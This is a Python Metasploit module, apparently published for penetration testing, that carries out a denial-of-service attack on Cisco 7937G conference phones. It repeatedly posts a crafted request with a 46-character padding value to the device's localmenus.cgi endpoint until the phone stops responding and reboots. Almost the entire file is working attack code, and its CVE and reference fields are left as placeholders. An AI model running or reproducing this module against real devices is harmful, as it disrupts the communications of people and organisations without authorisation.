#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Cisco 7937G Denial-of-Service Reboot Attack',
    'description': '''
        DoS reset attack
    ''',
    'authors': [
        'Cody Martin'
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': '<url>'},
        {'type': 'cve', 'ref': '2020-#'},
        {'type': 'edb', 'ref': '#'}
    ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': 'None'}
    }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    # Exploit
    url = "http://{}/localmenus.cgi".format(args['rhost'])
    data = "A"*46
    payload = {"func": "609", "data": data, "rphl": "1"}
    logging.info("FIRING ZE MIZZLES!")
    for i in range(1000):
        try:
            r = requests.post(url=url, params=payload, timeout=5)
            if r.status_code != 200:
                logging.error("Device doesn't appear to be functioning or web access is not enabled.")
                return
        except requests.exceptions.RequestException:
            logging.info('DoS reset attack completed!')
            return


if __name__ == '__main__':
    module.run(metadata, run)